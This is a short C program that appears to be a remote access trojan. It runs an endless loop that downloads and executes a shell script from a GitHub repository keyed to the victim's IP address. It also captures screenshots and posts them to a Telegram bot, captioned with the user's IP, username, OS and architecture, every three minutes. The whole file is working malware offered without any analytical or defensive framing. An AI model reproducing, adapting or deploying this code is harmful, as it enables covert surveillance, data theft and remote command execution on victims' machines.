#include <stdlib.h>
#include <string.h>
	int main(){
	char code[5000];
		while(1==1){
		system("cd /tmp ; curl https://raw.githubusercontent.com/paledega/DTRAT-command/master/$(curl http://ipecho.net/plain) > /tmp/command ; bash /tmp/command &");
		system("cd /tmp ; scrot -q 100 ehuehue.png | :");
		strcat(code,"caption=\"$(curl http://ipecho.net/plain)-$(echo $USER)-$(cat /etc/os-release | grep ^NAME | awk -F \"=\" '{print $2}' | sed \"s/ /_/g\")-$(uname -m)\";");
		strcat(code,"curl -s -X POST \"https://api.telegram.org/bot$(curl https://raw.githubusercontent.com/paledega/DTRAT-command/master/token)/sendPhoto\" -F chat_id=\"$(curl https://raw.githubusercontent.com/paledega/DTRAT-command/master/id)\" -F photo=\"@/tmp/ehuehue.png\" -F caption=$caption");
		system(code);
		system("rm -f /tmp/ehuehue.png | :");
		system("sleep 180 | :");
		strcpy(code,"");
	}
}
